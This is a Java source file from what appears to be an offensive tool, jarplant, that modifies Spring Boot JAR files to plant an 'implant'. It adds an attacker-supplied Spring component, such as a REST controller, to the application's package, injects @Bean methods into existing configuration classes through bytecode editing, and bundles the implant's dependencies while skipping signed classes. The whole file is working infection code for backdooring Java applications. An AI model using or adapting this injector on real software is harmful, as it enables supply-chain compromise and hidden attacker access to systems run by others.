package io.github.w1th4d.jarplant;

import javassist.bytecode.*;
import javassist.bytecode.annotation.Annotation;
import javassist.bytecode.annotation.MemberValue;

import java.util.*;
import java.util.jar.JarEntry;
import java.util.logging.Logger;

import static io.github.w1th4d.jarplant.Helpers.*;

public class SpringInjector implements Injector {
    private final static Logger log = Logger.getLogger("SpringInjector");
    private final ImplantHandler implantComponentHandler;
    private final ImplantHandler implantSpringConfigHandler;

    SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
        this.implantComponentHandler = implantComponentHandler;
        this.implantSpringConfigHandler = implantSpringConfigHandler;
    }

    public static SpringInjector createLoadedWith(ImplantHandler componentImplant, ImplantHandler springConfigImplant) throws ImplantException {
        // Validate Spring component implant
        ClassFile componentSpecimen = componentImplant.loadFreshRawSpecimen();
        if (findAllSpringAnnotatedMethods(componentSpecimen).isEmpty()) {
            throw new ImplantException("No Spring things in component implant.");
        }

        // Validate Spring config implant
        ClassFile springConfigSpecimen = springConfigImplant.loadFreshRawSpecimen();
        if (findAllSpringBeanMethods(springConfigSpecimen).isEmpty()) {
            throw new ImplantException("No @Bean method(s) in Spring config implant.");
        }

        return new SpringInjector(componentImplant, springConfigImplant);
    }

    @Override
    public boolean injectInto(JarFiddler jar) {
        boolean didInfect = false;
        boolean foundSignedClasses = false;

        if (jarLooksSigned(jar)) {
            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
            return false;
        }

        int countConfigModifications = 0;
        int countComponentsCreated = 0;
        for (JarFiddler.Entry entry : jar) {
            if (!entry.getName().endsWith(".class")) {
                continue;
            }
            if (entry.toJarEntry().getCodeSigners() != null) {
                foundSignedClasses = true;
                continue;
            }

            ClassFile currentlyProcessing = readClassFile(entry.getContent());
            ClassName currentlyProcessingName = ClassName.of(currentlyProcessing);
            if (!isSpringConfigurationClass(currentlyProcessing)) {
                continue;
            }
            log.fine("Found Spring configuration '" + entry.getName() + "'.");

            /*
             * By adding our own Spring component (like a RestController) into the JAR under the same package
             * as the Spring config class, Spring will happily load it automatically. This is assuming that
             * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
             * component needs to be explicitly referenced as a @Bean in the config class.
             */
            ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
            ClassName renamedImplantComponentName = ClassName.of(implantComponent).renamePackage(currentlyProcessingName);
            implantComponent.setName(renamedImplantComponentName.getFullClassName());
            JarEntry newJarEntry = new JarEntry(renamedImplantComponentName.getSpringJarEntryPath());
            try {
                jar.addNewEntry(newJarEntry, asByteArray(implantComponent));
                countComponentsCreated++;
            } catch (DuplicateEntryException e) {
                log.warning("Class '" + newJarEntry + "' already exist in JAR '" + jar + "'. Skipping.");
                break;
            }
            log.fine("Created implant class '" + newJarEntry.getName() + "'.");

            if (!hasComponentScanEnabled(currentlyProcessing)) {
                /*
                 * Component Scanning seems to not be enabled for this Spring configuration.
                 * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
                 */
                log.fine("Spring configuration '" + entry.getName() + "' is not set to automatically scan for components (@ComponentScan).");

                ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
                Optional<ClassFile> modifiedSpringConfig = addBeanToSpringConfig(currentlyProcessing, implantSpringConfig, implantComponent);
                if (modifiedSpringConfig.isEmpty()) {
                    log.warning("Class '" + entry.getName() + "' already infected. Skipping.");
                    continue;
                }

                entry.replaceContentWith(asByteArray(modifiedSpringConfig.get()));
                countConfigModifications++;
                log.fine("Injected @Bean method into '" + entry.getName() + "'.");
            }

            didInfect = true;
        }
        log.info("Modified " + countConfigModifications + " Spring configuration classes.");
        log.info("Created " + countComponentsCreated + " Spring component classes.");

        if (foundSignedClasses) {
            log.warning("Found signed classes. These were not considered for infection.");
        }

        // Add any dependency classes needed for the implant
        if (didInfect) {
            Map<ClassName, byte[]> allDependencies = new HashMap<>();
            allDependencies.putAll(implantSpringConfigHandler.getDependencies());
            allDependencies.putAll(implantComponentHandler.getDependencies());
            // Since this injector involves two different implant handlers, do a bit of manual exclusion of themselves
            allDependencies.remove(implantSpringConfigHandler.getImplantClassName());
            allDependencies.remove(implantComponentHandler.getImplantClassName());
            // Also note that the dependencies are not renamed in any way
            // Any custom classes bundled with the implant will contain the whole package name etc

            for (Map.Entry<ClassName, byte[]> dependencyEntry : allDependencies.entrySet()) {
                ClassName className = dependencyEntry.getKey();
                byte[] fileContent = dependencyEntry.getValue();

                JarEntry newJarEntry = new JarEntry(className.getClassFilePath());
                try {
                    jar.addNewEntry(newJarEntry, fileContent);
                } catch (DuplicateEntryException e) {
                    // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                    log.severe("Dependency file '" + className.getClassFilePath() + "' already exist. Aborting.");
                    didInfect = false;
                    break;
                }
            }
        }

        return didInfect;
    }

    static Optional<ClassFile> addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) {
        ClassFile clonedSpringConfig = cloneClassFile(existingSpringConfig);

        ClassName implantSpringConfigClassName = ClassName.of(implantSpringConfig);
        ClassName existingSpringConfigClassName = ClassName.of(existingSpringConfig);
        ClassName implantComponentClassName = ClassName.of(implantComponent);

        String implantPackageDesc = implantSpringConfigClassName.getPackageName().replace(".", "/");
        String targetPackageDesc = existingSpringConfigClassName.getPackageName().replace(".", "/");

        // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
        for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
            MethodInfo existingImplantControllerBean = clonedSpringConfig.getMethod(implantBeanMethod.getName());
            if (existingImplantControllerBean != null) {
                // The method that's about to be implanted already exists in the target class. Abort.
                return Optional.empty();
            }

            Map<String, String> translateTable = new HashMap<>();
            translateTable.put(implantPackageDesc + "/" + implantComponentClassName.getClassName(), targetPackageDesc + "/" + implantComponentClassName.getClassName());
            translateTable.put(implantSpringConfigClassName.getClassFormatInternalName(), existingSpringConfigClassName.getClassFormatInternalName());

            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
            MethodInfo targetBeanMethod = new MethodInfo(clonedSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist

            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(clonedSpringConfig.getConstPool(), translateTable);
            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
            targetBeanMethod.setCodeAttribute(codeAttr);

            ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
            if (exceptionsAttr != null) {
                ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(clonedSpringConfig.getConstPool(), translateTable);
                targetBeanMethod.setExceptionsAttribute(exceptions);
            }

            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);

            try {
                clonedSpringConfig.addMethod(targetBeanMethod);
            } catch (DuplicateMemberException e) {
                // This should already have be checked for
                throw new RuntimeException("Method '" + targetBeanMethod + "' already exist in '" + clonedSpringConfig.getName() + "' which is already checked for. This is unexpected.", e);
            }
        }

        return Optional.of(clonedSpringConfig);
    }

    // Copy all annotations from implant method to target method. Notice the const pools!
    static void copyAllMethodAnnotations(MethodInfo target, MethodInfo source) {
        AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
        if (sourceAttr == null) {
            // The source method does not have any annotations. Is this fine?
            return;
        }
        if (!(sourceAttr instanceof AnnotationsAttribute sourceAnnotationsAttr)) {
            throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
        }

        AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");

        // Retain any annotations that are already at the target method
        AttributeInfo alreadyExistingAnnotationsAttr = target.getAttribute("RuntimeVisibleAnnotations");
        if (alreadyExistingAnnotationsAttr != null) {
            Annotation[] existingAnnotations = ((AnnotationsAttribute) alreadyExistingAnnotationsAttr).getAnnotations();
            for (Annotation existingAnnotation : existingAnnotations) {
                targetAnnotationsAttr.addAnnotation(existingAnnotation);
            }
        }

        // Add the new annotations from the source method
        for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
            Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
            if (annotation.getMemberNames() != null) {
                for (String memberValueName : annotation.getMemberNames()) {
                    MemberValue memberValue = annotation.getMemberValue(memberValueName);
                    copiedAnnotation.addMemberValue(memberValueName, memberValue);
                }
            }
            targetAnnotationsAttr.addAnnotation(copiedAnnotation);
        }

        target.addAttribute(targetAnnotationsAttr);
    }

    private static List<MethodInfo> findAllSpringAnnotatedMethods(ClassFile springComponent) {
        List<MethodInfo> results = new ArrayList<>(1);

        for (MethodInfo method : springComponent.getMethods()) {
            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
            if (attr == null) {
                continue;
            }
            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
            }

            for (Annotation annotation : annotationAttr.getAnnotations()) {
                String annotationType = annotation.getTypeName();
                if (annotationType.startsWith("org.springframework.")) {
                    results.add(method);
                }
            }
        }

        return results;
    }

    private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
        List<MethodInfo> results = new ArrayList<>(1);

        for (MethodInfo method : springController.getMethods()) {
            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
            if (attr == null) {
                continue;
            }
            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
            }

            for (Annotation annotation : annotationAttr.getAnnotations()) {
                String annotationType = annotation.getTypeName();
                if (annotationType.equals("org.springframework.context.annotation.Bean")) {
                    results.add(method);
                }
            }
        }

        return results;
    }

    private static boolean isSpringConfigurationClass(ClassFile classFile) {
        List<Annotation> springAnnotations = classFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(SpringInjector::isAnySpringContextAnnotation)
                )
                .toList();
        return !springAnnotations.isEmpty();
    }

    private static boolean isAnySpringContextAnnotation(Annotation annotation) {
        return switch (annotation.getTypeName()) {
            case "org.springframework.boot.autoconfigure.SpringBootApplication" -> true;
            case "org.springframework.context.annotation.Configuration" -> true;
            default -> false;
        };
    }

    private static boolean hasComponentScanEnabled(ClassFile springContextClassFile) {
        Set<String> annotationsThatActivatesComponentScanning = Set.of(
                "org.springframework.context.annotation.ComponentScan",
                "org.springframework.boot.autoconfigure.SpringBootApplication"
        );

        List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                .filter(attribute -> attribute instanceof AnnotationsAttribute)
                .map(attribute -> (AnnotationsAttribute) attribute)
                .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
                        .filter(annotation -> annotationsThatActivatesComponentScanning.contains(annotation.getTypeName()))
                )
                .toList();
        return !componentScanAnnotations.isEmpty();
    }
}
